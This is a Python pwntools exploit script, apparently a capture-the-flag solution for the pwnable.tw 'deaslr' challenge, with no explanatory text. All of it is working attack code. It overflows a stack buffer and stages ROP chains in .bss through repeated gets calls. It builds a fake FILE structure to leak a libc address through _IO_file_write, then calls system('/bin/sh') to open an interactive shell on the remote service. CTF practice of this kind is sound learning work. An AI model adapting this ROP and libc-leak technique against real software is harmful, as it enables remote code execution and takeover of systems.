from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./deaslr",env = {"LD_PRELOAD":"./libc_64.so.6"})
	libc = ELF("./libc_64.so.6")
	elf = ELF("./deaslr")
else:
	p = remote("chall.pwnable.tw","10402")
	libc = ELF("./libc_64.so.6")
	elf = ELF("./deaslr")

def debugf():
	if debug:
		gdb.attach(p,"b *0x400555\nb *0x00000000004005A6")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
rdi = 0x00000000004005c3
rsp_r13_r14_r15_ret = 0x00000000004005bd
rbx_rbp_r12_r13_r14_r15_ret = 0x00000000004005BA
mov_call = 0x00000000004005A0
ret = 0x00000000004003f9

bss_addr = 0x0000000000601000
fake_file_addr = bss_addr + 0x400
rop_addr = bss_addr + 0x600
rop2_addr = bss_addr + 0x800
target = rop_addr - 0x50
target2 = rop_addr - 0x30
payload = "a" * 0x18
payload += p64(rdi) + p64(rop_addr)
payload += p64(elf.plt["gets"])
payload += p64(rsp_r13_r14_r15_ret) + p64(rop_addr - 0x18)
p.sendline(payload)
payload = ""
payload += p64(rdi) + p64(fake_file_addr)
payload += p64(elf.plt["gets"])
payload += p64(ret) * 0x20
payload += p64(rdi) + p64(target)
payload += p64(elf.plt["gets"])
payload += p64(rdi) + p64(target2)
payload += p64(elf.plt["gets"])
payload += p64(rsp_r13_r14_r15_ret) + p64(target - 0x18)
p.sendline(payload)
fake_file = p64(0x2) + p64(0) * 13 + p64(1)
p.sendline(fake_file)
# p _IO_file_write
# search -p 0x7ffff7a86b70
# distance 0x7ffff7dcff18 0x00007ffff7a7cce4
# 
rbx_v = (-(0x18e8/8)) & 0xffffffffffffffff
rbp_v = (-(0x18e8/8) + 1) & 0xffffffffffffffff
payload = p64(rbx_rbp_r12_r13_r14_r15_ret) + p64(rbx_v) + p64(rbp_v)
payload = payload[:len(payload)]
p.sendline(payload)
r13_v = 0x8 # r13 -> rdx
r14_v = elf.got["gets"]
r15_v = fake_file_addr
payload = p64(r13_v) + p64(r14_v) + p64(r15_v) + p64(mov_call)
payload += p64(0) *  7
payload += p64(rdi) + p64(rop2_addr)
payload += p64(elf.plt["gets"])
payload += p64(rsp_r13_r14_r15_ret) + p64(rop2_addr - 0x18)
p.sendline(payload)
leak_addr = u64(p.recv(8))
libc.address = leak_addr - libc.symbols["gets"]
log.success("libc_base:" + hex(libc.address))
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload = ""
payload += p64(rdi) + p64(binsh)
payload += p64(system)
p.sendline(payload)
p.interactive()
